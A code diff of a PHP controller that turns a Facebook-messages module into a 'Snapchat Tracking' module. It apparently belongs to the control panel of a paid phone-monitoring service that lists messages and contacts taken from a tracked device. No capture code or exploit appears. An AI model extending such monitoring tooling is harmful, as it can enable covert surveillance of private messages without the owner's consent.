@@ -20,12 +20,12 @@ class Snapchat extends BaseModuleController
 
     public function indexAction()
     {
-        $facebookModel = new \Models\Cp\Facebook($this->di);
+        $snapchatModel = new \Models\Cp\Snapchat($this->di);
 
         if ($this->getRequest()->isAjax()) {
             $dataTableRequest = new \System\DataTableRequest($this->di);
 
-            $data = $facebookModel->getDataTableData(
+            $data = $snapchatModel->getDataTableData(
                     $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
             );
             $this->checkDisplayLength($dataTableRequest->getDisplayLength());
@@ -33,35 +33,28 @@ class Snapchat extends BaseModuleController
         }
 
         if ($this->view->paid) {
-            $this->view->accounts = $facebookModel->getAccountsList($this->di['devId']);
+            $this->view->accounts = $snapchatModel->getAccountsList($this->di['devId']);
         }
 
-        $this->setView('cp/facebook.htm');
+        $this->setView('cp/snapchat/index.htm');
     }
 
     public function listAction()
     {
-        $facebookModel = new \Models\Cp\Facebook($this->di);
+        $snapchatModel = new \Models\Cp\Snapchat($this->di);
 
-        switch ($this->params['tab']) {
-            case 'group':
-                $this->view->list = $facebookModel->getGroupList($this->di['devId'], $this->params['account'], $this->params['id']);
-                $this->view->users = $facebookModel->getGroupUsers($this->di['devId'], $this->params['account'], $this->params['id']);
-                break;
-
-            case 'private':
-                $this->view->list = $facebookModel->getPrivateList($this->di['devId'], $this->params['account'], $this->params['id']);
-                break;
-        }
+        $this->view->list = $snapchatModel->getMessagesList($this->di['devId'], $this->params['account'], $this->params['id']);
 
         if (!count($this->view->list)) {
             $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
-            $this->redirect($this->di['router']->getRouteUrl('facebook'));
+            $this->redirect($this->di['router']->getRouteUrl('snapchat'));
         }
 
-        $this->view->tab = $this->params['tab'];
+        $this->view->user = $snapchatModel->getUserName($this->di['devId'], $this->params['account'], $this->params['id']);
 
-        $this->setView('cp/facebookList.htm');
+        $this->view->account = $this->params['account'];
+
+        $this->setView('cp/snapchat/list.htm');
     }
 
     protected function postAction()
@@ -69,13 +62,13 @@ class Snapchat extends BaseModuleController
         parent::postAction();
         $this->buildCpMenu();
 
-        $this->view->title = $this->di['t']->_('Facebook Messages');
+        $this->view->title = $this->di['t']->_('Snapchat Tracking');
     }
-    
+
     protected function isModulePaid()
     {
         $devicesLimitations = new Limitations($this->di['db']);
-        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::FACEBOOK);
+        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::SNAPCHAT);
     }
 
 }
